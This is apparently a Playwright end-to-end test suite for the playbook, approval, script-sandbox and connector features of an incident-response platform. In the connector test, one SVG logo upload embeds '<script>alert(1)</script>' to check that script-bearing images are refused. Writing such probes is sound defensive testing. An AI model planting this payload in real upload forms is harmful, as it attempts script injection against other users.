    .getByText('trigger.incident.severity', { exact: true })
    .click()
  await expect(inspector.getByRole('textbox', { name: 'Comparison 1: what to compare' })).toHaveValue(
    '{{ trigger.incident.severity }}',
  )
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('{{ trigger.incident.severity ')
  await expect(inspector.getByText('The expression is not closed: add }}')).toBeVisible()
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('high')

  // Without a search the commands are in groups that start closed: the group is opened first.
  await expect(library.getByRole('tab', { name: /^Commands/ })).toHaveAttribute('aria-selected', 'true')
  await expect(library.getByRole('button', { name: 'Add a note', exact: true })).toBeHidden()
  await library.locator('summary', { hasText: /^Nik/ }).click()
  await library.getByRole('button', { name: 'Add a note', exact: true }).click()
  await expect(nodes).toHaveCount(3)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(2)
  await expect(inspector.getByRole('group', { name: 'Port then' })).toBeVisible()

  // The draft saves itself: a reload finds the three nodes.
  await expect(area.getByText('draft saved')).toBeVisible()
  await page.reload()
  await expect(nodes).toHaveCount(3)

  // Not a version yet: the note has no text. The server says what and where.
  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('One thing to fix before this can be a version.')).toBeVisible()
  await expect(inspector.getByText('"text" is required')).toBeVisible()
  await expect(nodes.filter({ hasText: 'Add a note' })).toContainText('1 to fix')
  await inspector
    .getByLabel(/^text/)
    .fill('Severity is {{ trigger.incident.severity }}: look at {{ trigger.incident.name }}')

  // An "End" on the other branch, drawn from the inspector without a pointer; then undo and redo.
  // The nodes of the flow have a tab of their own.
  await library.getByRole('tab', { name: /^Flow/ }).click()
  await library.getByRole('button', { name: 'End', exact: true }).click()
  await library.getByRole('tab', { name: /^Commands/ }).click()
  await expect(nodes).toHaveCount(4)
  await area.getByRole('button', { name: 'Node list' }).click()
  const table = area.getByRole('table', { name: 'The nodes of the playbook' })
  await expect(table.getByRole('row')).toHaveCount(5)
  await table.getByRole('button', { name: 'Condition' }).click()
  await inspector.getByLabel('Draw an edge "no" to').selectOption({ label: 'End' })
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).not.toContainText('no → End')
  await area.getByRole('button', { name: 'Redo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Tidy up' }).click()
  await area.getByRole('button', { name: 'Node list' }).click()

  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('Version 1 saved: it is what runs from now on.')).toBeVisible()
  await expect(area.getByText('playbook · version 1')).toBeVisible()
  await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

  // Versions; then what the playbook may reach, behind the double check.
  await area.getByRole('radio', { name: 'Versions' }).click()
  await expect(page).toHaveURL(/\/versions$/)
  await expect(area.getByRole('table', { name: 'Versions of Note on high' }).getByRole('row')).toHaveCount(2)
  await area.getByRole('radio', { name: 'Settings' }).click()
  const network = area.getByRole('region', { name: 'Network' })
  await network.getByLabel('Add a host').fill('https://Hooks.Example.org/path')
  await network.getByRole('button', { name: 'Add' }).click()
  await expect(network.getByRole('listitem').filter({ hasText: 'hooks.example.org' })).toBeVisible()
  await network.getByRole('radio', { name: 'Any host' }).click()
  const check = page.getByRole('dialog', { name: 'Let this playbook reach any host?' })
  const allow = check.getByRole('button', { name: 'Allow any host' })
  await expect(allow).toBeDisabled()
  await check.getByRole('checkbox').check()
  await check.locator('#data-guard-name').fill('note on high')
  await expect(allow).toBeDisabled() // the name, exactly as it is written
  await check.locator('#data-guard-name').fill('Note on high')
  await allow.click()
  await expect(check).toBeHidden()
  await expect(network.getByText('any host', { exact: true })).toBeVisible()
  await network.getByRole('radio', { name: 'Listed hosts only' }).click()
  await expect(network.getByText('any host', { exact: true })).toBeHidden()
  // A class of data is opened the same way, and closed with one click.
  const data = area.getByRole('region', { name: 'Data that may leave' })
  await data.getByRole('button', { name: 'Open: E-mail addresses' }).click()
  const open = page.getByRole('dialog', { name: 'Let e-mail addresses leave Nik in this playbook?' })
  await expect(open).toContainText('hooks.example.org')
  await open.getByRole('checkbox').check()
  await open.locator('#data-guard-name').fill('Note on high')
  await open.getByRole('button', { name: 'Allow e-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeVisible()
  await data.getByRole('button', { name: 'Close: E-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeHidden()

  // The list: on, with its trigger and version. Settings has the switch for everything.
  await area.getByRole('button', { name: 'All playbooks' }).click()
  const row = area.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(row).toContainText('incident.created')
  await row.getByRole('switch').click()
  await expect(row.getByRole('switch')).toBeChecked()
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(area).toBeHidden()

  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Stop all').click()
  await expect(page).toHaveURL(/\/settings\/automation\/stop-all$/)
  await expect(settings.getByText('running')).toBeVisible()
  await expect(settings.getByText('alive')).toBeVisible()
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Network and data').click()
  // The hosts every playbook may reach are a list: the section says which, and Lists edits it.
  await expect(settings.getByLabel('Hosts: reads the list')).toHaveValue('automation_hosts')
  await settings.getByRole('button', { name: 'Open in Lists' }).click()
  await expect(page).toHaveURL(/\/settings\/lists\/all\?open=automation_hosts$/)
  const hosts = settings.getByRole('article', { name: 'Hosts every playbook may reach' })
  await hosts.getByLabel('Items, one a line').fill('Intel.Example.org')
  await hosts.getByRole('button', { name: 'Save the items' }).click()
  await expect(hosts.getByRole('status')).toHaveText('Saved.')
  // Kept as a host is written: in lower case.
  await expect(hosts.getByLabel('Items, one a line')).toHaveValue('intel.example.org')
  await expect(hosts.getByRole('region', { name: 'Where it is used' })).toContainText('Network and data')
  await settings.getByRole('button', { name: 'Close settings' }).click()
  // The area was reloaded on its own address: back to the incident the next steps work on.
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook runs on an incident: the approval is asked where the incident is, the run shows what happened', async () => {
  test.setTimeout(240_000) // the worker takes a step every second or so, and the story has many
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // A playbook that asks a person, then writes a note (made through the API: the canvas has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Ask then note' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'ask',
        kind: 'approval',
        name: 'Ask first',
        position: { x: 40, y: 160 },
        config: { question: 'Add a note to {{ trigger.incident.name }}?', detail: { why: 'a test' } },
      },
      {
        id: 'note',
        kind: 'action',
        name: 'Add a note',
        position: { x: 40, y: 280 },
        config: { action: 'nik.add-note', args: { text: 'Approved by {{ ask.by }}: {{ ask.comment }}' } },
      },
    ],
    edges: [
      { from: 'start', to: 'ask' },
      { from: 'ask', port: 'approved', to: 'note' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status()).toBe(201)

  // Run by hand, from the menu of the incident in the list.
  await openIncidentList()
  await incidentRow('WKS-FINANCE-01').click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-incident')).toHaveAttribute('data-incident', incidentId)
  await dialog.locator('#run-playbook').selectOption(playbookId)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()

  // The run: the same canvas, each node by what happened to it; it waits for a person.
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  const status = area.getByRole('status', { name: 'Status of the run' })
  await expect(status).toHaveText('waiting for approval', { timeout: 15_000 })
  await expect(area.getByTestId('rf__node-ask')).toContainText('waiting')
  await expect(area.getByTestId('rf__node-note')).toContainText('pending')
  await expect(area.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })).toContainText(
    'a test',
  )

  // The rail counts what waits, and the incident shows the question above its tabs.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(page.getByRole('button', { name: 'Automations (1 approval waits)' })).toBeVisible()
  // Closing the run goes back to the list it was started from; the incident is opened from there.
  await incidentRow('WKS-FINANCE-01').dblclick()
  const banner = page.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })
  await banner.getByLabel('A comment with the answer').fill('looks right')
  await banner.getByRole('button', { name: 'Approve' }).click()
  await expect(page.getByText('Approved: the run goes on.')).toBeVisible()
  await expect(banner).toBeHidden()
  await expect(page.getByRole('button', { name: 'Automations', exact: true })).toBeVisible()

  // The work plan of the incident lists its runs; a run opens on its page.
  await tabs.getByRole('button', { name: 'Work plan', exact: true }).click()
  const onIncident = page.getByRole('table', { name: 'Runs on this incident' })
  await expect(onIncident.getByRole('row').filter({ hasText: 'Ask then note' })).toContainText('done', {
    timeout: 15_000,
  })
  await onIncident.getByRole('button', { name: 'Ask then note' }).click()
  await expect(status).toHaveText('done')
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await expect(steps).toContainText('“looks right”')
  await steps.getByRole('button', { name: /Add a note/ }).click()
  await expect(steps.getByText('Came out')).toBeVisible()
  await expect(steps.getByText('Went in')).toBeVisible()

  // From the playbook's page: a dry run asks nobody and writes nothing.
  await area.getByRole('button', { name: 'version 1' }).click()
  await expect(area.getByRole('heading', { name: 'Ask then note' })).toBeVisible()
  await area.getByRole('button', { name: 'Run…' }).click()
  // Opened from the playbook: it is the one that runs, and the incident is found by typing.
  const own = page.getByRole('dialog', { name: 'Run “Ask then note”' })
  await expect(own.locator('#run-playbook')).toBeHidden()
  const picker = own.getByRole('combobox', { name: 'On which incident' })
  await picker.fill('zzzz no such incident')
  await expect(own.getByRole('listbox', { name: 'Incidents that match' })).toContainText('No incident matches.')
  await picker.fill('wks-finance')
  const offered = own.getByRole('listbox', { name: 'Incidents that match' }).getByRole('option')
  await expect(offered).toHaveCount(1)
  await expect(offered).toContainText(/#\d{5}/)
  await picker.press('Enter')
  await expect(own.locator('#run-incident')).toHaveAttribute('data-incident', incidentId)
  await own.getByRole('checkbox').check()
  await own.getByRole('button', { name: 'Start the dry run' }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  await expect(area.getByText('dry run', { exact: true })).toBeVisible()
  await expect(status).toHaveText('done', { timeout: 15_000 })
  await steps.getByRole('button', { name: /Ask first/ }).click()
  await expect(steps).toContainText('"by": "dry run"')

  // Every run, newest first; then the approvals answered lately.
  await area.getByRole('button', { name: 'All runs' }).click()
  const all = area.getByRole('table', { name: 'Runs' })
  await expect(all.getByRole('row')).toHaveCount(3)
  await expect(all.getByRole('row').nth(1)).toContainText('dry run')
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Approvals' }).click()
  await expect(area.getByText('Nothing waits for an answer')).toBeVisible()
  await expect(area.getByRole('region', { name: 'Answered lately' })).toContainText('looks right')

  // A trigger: the playbook drawn on the canvas waits for incidents of high severity.
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-automation', name: 'E2E high', severity: 'high', data: {} },
  })
  expect(created.status()).toBe(201)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  const triggered = all.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(async () => {
    await area.getByRole('button', { name: 'Refresh' }).click()
    await expect(triggered).toContainText('done', { timeout: 1000 })
  }).toPass({ timeout: 20_000 })
  await expect(triggered).toContainText('incident.created')
  expect((await page.request.delete('/api/incidents/e2e-automation')).status()).toBe(204)

  // Back on the incident: the note the playbook wrote is marked, the dry run wrote none.
  await page.goto(before)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByText('Approved by admin: looks right')).toBeVisible()
  await expect(page.getByRole('button', { name: 'automation', exact: true })).toHaveCount(1)
})

test('a run a restart interrupted waits for a person: the step says what happened to it, and the three answers are there', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  // A playbook whose only step waits a minute, made and started through the API: its run is still
  // going when it is opened.
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Cut by a restart' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      { id: 'ticket', kind: 'wait', name: 'Open a ticket', position: { x: 40, y: 160 }, config: { seconds: 60 } },
    ],
    edges: [{ from: 'start', to: 'ticket' }],
  }
  expect(
    (await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })).status(),
  ).toBe(201)
  const started = await page.request.post(`/api/automation/playbooks/${playbookId}/run`, { data: {} })
  expect(started.status()).toBe(201)
  const runId = (await started.json()).id

  // A worker cannot be killed from here in the middle of a call to another system, which is what
  // makes a step "interrupted" (the server's side of it is backend/tests/test_restarts_engine.py).
  // The page is given what the server answers then: the run as it is, with that step interrupted.
  const cut = [
    { at: '2026-11-21T10:02:00+00:00', what: 'interrupted' },
    { at: '2026-11-21T10:02:00+00:00', what: 'waiting' },
  ]
  let answered = null
  const asRead = `**/api/automation/runs/${runId}`
  const asAnswered = `**/api/automation/runs/${runId}/steps/*/resolve`
  await page.route(asRead, async (route) => {
    const response = await route.fetch()
    const run = await response.json()
    const waits = answered === null
    const steps = run.steps.map((step) => {
      if (step.node !== 'ticket') return step
      if (!waits)
        return { ...step, restarts: [...cut, { at: '2026-11-21T10:30:00+00:00', what: 'again', by: 'admin' }] }
      return {
        ...step,
        status: 'interrupted',
        error: 'Interrupted by a restart: it is not known whether this happened',
        input: { action: 'servicenow.create-incident', args: { short_description: 'Laptop of finance' } },
        restarts: cut,
      }
    })
    await route.fulfill({
      response,
      json: { ...run, status: waits ? 'waiting' : run.status, interrupted: waits, steps },
    })
  })
  await page.route(asAnswered, async (route) => {
    answered = route.request().postDataJSON()
    await route.fulfill({ json: { id: runId, status: 'running', interrupted: false, steps: [] } })
  })

  await page.goto(`/automation/runs/${runId}`)
  const area = page.getByRole('region', { name: 'Automations' })
  const status = area.getByRole('status', { name: 'Status of the run' })
  await expect(status).toHaveText('interrupted by a restart', { timeout: 15_000 })
  await expect(area.getByTestId('rf__node-ticket')).toContainText('interrupted')
  // The run says what it does not know, shows what was about to leave, and asks.
  const banner = area.getByRole('region', { name: 'Interrupted by a restart: Open a ticket' })
  await expect(banner).toContainText('it is not known whether it happened')
  await expect(banner).toContainText('Nik does not do it twice by guessing')
  await expect(banner).toContainText('servicenow.create-incident')
  const answers = banner.getByRole('group', { name: 'What happened to Open a ticket' })
  await expect(answers.getByRole('button')).toHaveText([
    'It happened, go on',
    'It did not, do it again',
    'Stop the run',
  ])
  // The step keeps what the restart did to it.
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await steps.getByRole('button', { name: /Open a ticket/ }).click()
  await expect(steps).toContainText('interrupted by a restart: waits for a person to say what happened')
  const history = steps.getByRole('list', { name: 'What restarts did to this step' })
  await expect(history.getByRole('listitem')).toHaveCount(2)
  await expect(history.getByRole('listitem').first()).toContainText('Interrupted by a restart at')
  await expect(history.getByRole('listitem').last()).toContainText('it waits for a person since')

  // An answer is one request, with the word the server takes; the run then goes on.
  await answers.getByRole('button', { name: 'It did not, do it again' }).click()
  await expect(page.getByText('The step is done again.')).toBeVisible()
  expect(answered).toEqual({ answer: 'again' })
  await expect(banner).toBeHidden()
  await expect(status).not.toHaveText('interrupted by a restart')
  await expect(history.getByRole('listitem')).toHaveCount(3)
  await expect(history.getByRole('listitem').last()).toContainText('admin said it did not happen: done again at')

  // The list of runs finds the runs that wait this way by a status of their own.
  await page.unroute(asRead)
  await page.unroute(asAnswered)
  await area.getByRole('button', { name: 'All runs' }).click()
  await area.getByLabel('Status').selectOption('interrupted')
  await expect(area.getByRole('table', { name: 'Runs' })).toHaveCount(0)
  await area.getByLabel('Status').selectOption('')

  // Nothing of this is left: the run goes with its playbook.
  expect((await page.request.post(`/api/automation/runs/${runId}/stop`)).status()).toBe(200)
  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('a script is written, tested in the sandbox, saved as a version and offered as a node', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  // The sandbox runs in CI (and wherever E2E_SANDBOX_URL names one); without it, what needs one is checked to be refused.
  const sandbox = Boolean(process.env.E2E_SANDBOX_URL)
  /** Replace what a code editor holds. */
  const write = async (editor, text) => {
    await editor.click()
    await page.keyboard.press('ControlOrMeta+a')
    await page.keyboard.insertText(text)
  }

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts$/)
  const shipped = area.getByRole('table', { name: 'Scripts' }).getByRole('row').filter({ hasText: 'GroupByField' })
  await expect(shipped).toContainText('in the library')
  await expect(shipped).toContainText('shipped with Nik')

  // A name is how nodes call the script: a capital letter, letters and digits.
  await area.getByRole('button', { name: 'New script' }).click()
  const create = page.getByRole('dialog', { name: 'New script' })
  await create.getByLabel('Name').fill('count words')
  await expect(create.getByRole('alert')).toContainText('A capital letter')
  await expect(create.getByRole('button', { name: 'Create' })).toBeDisabled()
  await create.getByLabel('Name').fill('CountWords')
  await create.getByLabel('Description').fill('How many words a text has')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'CountWords' })).toBeVisible()
  await expect(area.getByText('no version yet: not in the library')).toBeVisible()

  // The code, what it takes and gives, and its test.
  const code = area.getByRole('textbox', { name: 'Code of the script' })
  await write(code, 'print("no function here")\n')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('def main(args)')
  await expect(area.getByRole('button', { name: 'Run the test' })).toBeDisabled()
  await write(
    code,
    'def main(args):\n    words = str(args.get("text", "")).split()\n    print("counting", len(words))\n    return {"count": len(words)}\n',
  )
  await area.getByLabel('Argument 1: name').fill('text')
  await area.getByLabel('Output 1: name').fill('count')
  await area.getByLabel('Output 1: type').selectOption('number')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('Not JSON')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"}')
  await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 2}')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The draft is the server's: a reload finds the code.
  await page.reload()
  await expect(code).toContainText('counting')

  if (sandbox) {
    const result = area.getByRole('status', { name: 'Result of the test' })
    // The test runs the draft: it returns 3, the test expected 2.
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('failed')
    await expect(result).toContainText('did not return what the test expects')
    await expect(result).toContainText('counting 3')
    // A version needs the test to pass.
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText(/^The test does not pass/)).toBeVisible()
    await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 3}')
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('passed')
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText('Version 1 saved: CountWords is in the library of nodes.')).toBeVisible()
    await expect(area.getByText('script · version 1')).toBeVisible()
    await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

    // What the draft changes from a version, line by line; the version can be put back.
    await write(
      code,
      'def main(args):\n    words = str(args.get("text", "")).split()\n    return {"count": len(words)}\n',
    )
    await expect(area.getByText('draft changed')).toBeVisible()
    await area.getByRole('button', { name: 'See version 1' }).click()
    const version = page.getByRole('dialog', { name: 'Version 1' })
    await expect(version).toContainText('0 lines added, 1 removed')
    await expect(version.getByLabel('What the draft changes from version 1')).toContainText(
      '-     print("counting", len(words))',
    )
    await version.getByRole('button', { name: 'Put version 1 back into the draft' }).click()
    await expect(code).toContainText('counting')

    // The script is now a node of the library.
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
    await area.getByRole('button', { name: 'Note on high' }).click()
    const library = area.getByRole('complementary', { name: 'Node library' })
    await library.getByLabel('Search nodes').fill('countwords')
    await expect(library.getByRole('button', { name: 'CountWords' })).toBeVisible()
  } else {
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
    await expect(area.getByRole('region', { name: 'The box every script runs in' }).getByRole('alert')).toContainText(
      'The sandbox is not configured',
    )
    await expect(area.getByRole('row').filter({ hasText: 'CountWords' })).toContainText('draft · not usable yet')
  }

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a connector is added from its file, a connection is made, and its commands are nodes', async () => {
  test.setTimeout(180_000)
  const before = page.url()
  const source = readFileSync(new URL('./fixtures/acme-connector.yml', import.meta.url), 'utf8')
  const file = (text) => ({ name: 'acme.yml', mimeType: 'text/yaml', buffer: Buffer.from(text) })

  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Connectors').click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors$/)

  // A file with a mistake is not installed: the problem comes with its line.
  const wrong = source.replace(
    'request: { method: GET, path: "/tickets/{{ args.number }}" }',
    'request: { method: FETCH, path: "/tickets/{{ args.nmber }}" }',
  )
  await settings.getByLabel('Connector file to add').setInputFiles(file(wrong))
  const add = page.getByRole('dialog', { name: 'Add acme.yml' })
  const problems = add.getByRole('list', { name: 'Problems of the file' })
  await expect(problems.getByRole('listitem')).toHaveCount(1)
  await expect(problems).toContainText('line 16')
  await expect(add.getByRole('button', { name: 'Install' })).toBeDisabled()
  await add.getByRole('button', { name: 'Cancel' }).click()

  await settings.getByLabel('Connector file to add').setInputFiles(file(source))
  await expect(add).toContainText('version 1: 2 commands')
  await expect(add).toContainText('a user name and a password')
  await add.getByRole('button', { name: 'Install' }).click()
  await expect(settings.getByRole('status')).toContainText('Acme Desk is installed: version 1, 2 commands.')
  const installed = settings
    .getByRole('list', { name: 'Connectors', exact: true })
    .getByRole('listitem')
    .filter({ hasText: 'Acme Desk' })
    .first()
  await expect(installed).toContainText('not configured')
  await expect(installed).toContainText('not verified')
  // The filters count them, and the box finds one by its name.
  const which = settings.getByRole('group', { name: 'Which connectors' })
  await expect(which.getByRole('button', { name: /^Not configured/ })).toContainText(/· \d+$/)
  await settings.getByLabel('Find a connector or an instance').fill('acme desk')
  await expect(settings.getByRole('list', { name: 'Connectors', exact: true }).locator('> li')).toHaveCount(1)
  // Its commands and its file can be read.
  await installed.getByRole('button', { name: 'Acme Desk', exact: true }).click()
  const shown = page.getByRole('dialog', { name: 'Acme Desk' })
  await expect(shown.getByRole('table', { name: 'Commands of Acme Desk' }).getByRole('row')).toHaveCount(3)
  await shown.getByText('The file', { exact: true }).click()
  await expect(shown.getByLabel('The file of Acme Desk')).toContainText('base_url: "{{ config.url }}"')
  // It is given a logo: an image that is not a drawing is refused, a drawing marks the connector.
  const svg = (inner) => ({
    name: 'logo.svg',
    mimeType: 'image/svg+xml',
    buffer: Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8">${inner}</svg>`),
  })
  await shown.getByLabel('Logo of Acme Desk').setInputFiles(svg('<script>alert(1)</script>'))
  await expect(shown.getByRole('alert')).toContainText('a drawing and nothing else')
  await shown.getByLabel('Logo of Acme Desk').setInputFiles(svg('<rect width="8" height="8" fill="#246"/>'))
  await expect(shown.getByRole('button', { name: 'Change the logo' })).toBeVisible()
  await shown.getByRole('button', { name: 'Close', exact: true }).last().click()
  const logo = installed.locator('img').first()
  await expect(logo).toHaveAttribute('src', /\/api\/automation\/connectors\/acme\/logo\?v=/)
  expect(await logo.evaluate((image) => image.complete && image.naturalWidth > 0)).toBe(true)

  // An instance, under its connector: the form is the connector's; credentials are written and
  // never shown again. There is no Connections section any more.
  await expect(sections.getByRole('button', { name: 'Connections', exact: true })).toHaveCount(0)
  await installed.getByRole('button', { name: 'Add an instance of Acme Desk' }).click()
  const form = settings.getByRole('complementary', { name: 'New instance of Acme Desk' })
  await form.locator('#instance-name').fill('Acme test')
  await form.getByLabel('Instance address').fill('desk.example.invalid')
  await expect(form.getByRole('button', { name: 'Create' })).toBeDisabled() // not an https:// address
  await form.getByLabel('Instance address').fill('https://desk.example.invalid/api')
  await form.getByLabel('User name').fill('svc')
  await form.getByLabel('Password').fill('s3cret-pass')
  await form.getByRole('button', { name: 'Create' }).click()
  const row = installed
    .getByRole('list', { name: 'Instances of Acme Desk' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme test' })
  await expect(row).toContainText('desk.example.invalid')
  await expect(row).toContainText('never tested')
  await expect(installed).toContainText('1 instance · on')
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  const edit = settings.getByRole('complementary', { name: 'Instance Acme test' })
  await expect(edit.getByLabel(/^Password/)).toHaveValue('')
  await expect(edit.getByLabel(/^Password/)).toHaveAttribute('placeholder', 'stored: type to replace it')
  // More keys than one: a second key is added, the keys take turns as chosen, and nothing of a key is shown again.
  // The form has a tab for each of its parts; the keys are one.
  await edit.getByRole('tab', { name: 'Keys' }).click()
  const keys = edit.getByRole('region', { name: 'Keys' })
  const held = keys.getByRole('list', { name: 'The keys of the instance' }).getByRole('listitem')
  await expect(held).toHaveCount(1)
  await expect(held.first()).toContainText('The credentials of the instance, set on the Connection tab.')
  await keys.getByRole('button', { name: 'Add a key' }).click()
  // One "Save" for the whole instance: it waits for the new key to have its credential.
  await expect(edit.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()
  await expect(edit.getByRole('button', { name: 'Save', exact: true })).toHaveAttribute(
    'title',
    '"Key 2" has no credential yet',
  )
  await held.nth(1).getByLabel('Name of key 2').fill('lab')
  await held.nth(1).getByLabel('User name').fill('lab')
  await held.nth(1).getByLabel('Password').fill('lab-secret-1')
  await keys.getByRole('radio', { name: /^The same key until it is used up/ }).check()
  await keys.getByLabel('Requests a minute').fill('4')
  await keys.getByLabel('Keep an answer for this many hours').fill('24')
  await edit.getByRole('button', { name: 'Save', exact: true }).click()
  // Saved with everything else of the instance; opened again, the key is there and shows nothing of itself.
  await expect(edit).toHaveCount(0) // the form closes once everything is saved
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  await edit.getByRole('tab', { name: 'Keys' }).click()
  await expect(held).toHaveCount(2)
  await expect(held.nth(1).getByLabel(/^Password/)).toHaveValue('')
  await expect(held.nth(1)).toContainText('stored')
  await expect(keys.getByRole('button', { name: 'Forget the kept answers' })).toBeVisible()
  const kept = (await (await page.request.get('/api/automation/instances')).json()).instances.find(
    (item) => item.name === 'Acme test',
  )
  expect(kept.keys.map((key) => key.name)).toEqual(['Key 1', 'lab'])
  expect(kept.keyPolicy).toMatchObject({ mode: 'until_exhausted', perMinute: 4, cacheHours: 24 })
  expect(JSON.stringify(kept)).not.toContain('lab-secret-1')
  await edit.getByRole('button', { name: 'Close the instance' }).click()
  // Off and on again: the connector is enabled while one of its instances is on.
  await row.getByRole('switch', { name: 'Acme test is on' }).click()
  await expect(installed).toContainText('1 instance · off')
  await row.getByRole('switch', { name: 'Acme test is off' }).click()
  await expect(installed).toContainText('1 instance · on')
  // The row changes at once and the server answers after: its "is on" takes away whatever alert is
  // shown, so it is waited for before the test of the instance puts one there.
  await expect(settings.getByRole('status').filter({ hasText: 'Acme test is on.' })).toBeVisible()
  // The test reaches the host of the instance: this one does not exist, and the row says so.
  await row.getByRole('button', { name: 'Test the instance Acme test' }).click()
  await expect(settings.getByRole('alert')).toContainText('Acme test: ', { timeout: 30_000 })
  await expect(row).toContainText('failed')
  await settings.getByLabel('Find a connector or an instance').fill('')
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // On the canvas the connector is a group of the library; a node of it names its connection.
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Note on high' }).click()
  const library = area.getByRole('complementary', { name: 'Node library' })
  await library.getByLabel('Search nodes').fill('acme')
  await expect(library.getByRole('button', { name: /^create-ticket/ })).toContainText('changes')
  await library.getByRole('button', { name: 'get-ticket', exact: true }).click()
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  await expect(inspector.getByRole('heading', { name: /Acme Desk/ })).toBeVisible()
  await expect(inspector.getByLabel(/^Instance/)).toHaveValue('')
  await inspector.getByLabel(/^Instance/).selectOption('Acme test')
  await inspector.getByLabel(/^number/).fill('T-1')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The playbook is left as it was.
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(area.getByTestId('playbook-canvas').locator('.react-flow__node')).toHaveCount(4)
